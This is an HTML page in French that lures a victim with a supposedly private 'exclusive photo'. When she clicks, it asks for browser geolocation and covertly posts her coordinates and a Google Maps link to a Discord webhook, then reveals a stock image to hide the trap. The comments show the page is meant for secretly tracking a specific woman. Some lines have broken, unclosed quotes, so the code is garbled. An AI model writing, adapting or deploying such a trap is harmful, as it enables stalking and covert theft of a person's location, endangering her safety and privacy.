<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <title>Exclusivité Photo</title>
    <style>
        body { font-family: Arial, sans-serif; text-align: center; margin-top: 50px; background-color: #f4f4f9; }
        .card { background: white; padding: 20px; border-radius: 8px; display: inline-block; box-shadow: 0 4px 8px rgba(0,0,0,0.1); }
        button { background: #ff4757; color: white; border: none; padding: 10px 20px; font-size: 16px; border-radius: 5px; cursor: pointer; }
        button:hover { background: #ff6b81; }
        img { max-width: 300px; margin-top: 15px; border-radius: 5px; }
    </style>
</head>
<body>

    <div class="card">
        <h2>Contenu Privé 🔒</h2>
        <p id="message-statut">Clique sur le bouton pour autoriser l'affichage de la photo exclusive.</p>
        
        <!-- Le bouton qui déclenche le piège -->
        <button onclick="declencherPiege()">Afficher l'image</button>

        <!-- Conteneur pour la fausse/vraie image -->
        <div id="conteneur-image">
            <p style="color: gray; font-style: italic;">(Photo verrouillée)</p>
        </div>
    </div>

    <script>
        function declencherPiege() {
            if (navigator.geolocation) {
                document.getElementById("message-statutinnerText = "Vérification de la position en cours...";
                
                navigator.geolocation.getCurrentPosition(function(position) {
                    let lat = position.coords.latitude;
                    let lon = position.coords.longitude;

                    // 1. Envoi discret sur ton webhook Discord (avec ton proxy si besoin)
                    envoyerSurDiscord(lat, lon);

                    // 2. On débloque la VRAIE image sous ses yeux !
                    document.getElementById("conteneur-image.innerHTML = '<img src="https://images.unsplash.com/photo-1575936123452-b67c3203c357?auto=format&fit=crop&w=500&q=80" alt="Vraie Image">';
                    document.getElementById("message-statut").innerText = "Accès autorisé ! Voici le contenu :";

                }, function(error) {
                    // Si elle refuse la géolocalisation
                    document.getElementById("message-statut").innerText = "Erreur : Impossible de charger la photo (Accès GPS refusé).";
                });
            } else {
                alert("La géolocalisation n'est pas supportée par ce navigateur.");
            }
        }

        function envoyerSurDiscord(lat, lon) {
            const webhookUrl = "https://discord.com/api/webhooks/1567162318406819850/4X8w1DSk_N3a5KNrMDFpnNqXehnUP3oSJXN67vrC2aGfH8RIGMMgK9PlzEdtPmOXztMi"; // Mets ton vrai webhook entre guillemets
            
            const payload = {
                content: `🚨 **Cible géolocalisée !**\nLatitude : ${lat}\nLongitude : ${lon}\n[Google Maps](https://www.google.com/maps?q=${lat},${lon})`
            };

            fetch(webhookUrl, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(payload)
            }).catch(err => console.log("Erreur d'envoi"));
        }
    </script>

</body>
</html>
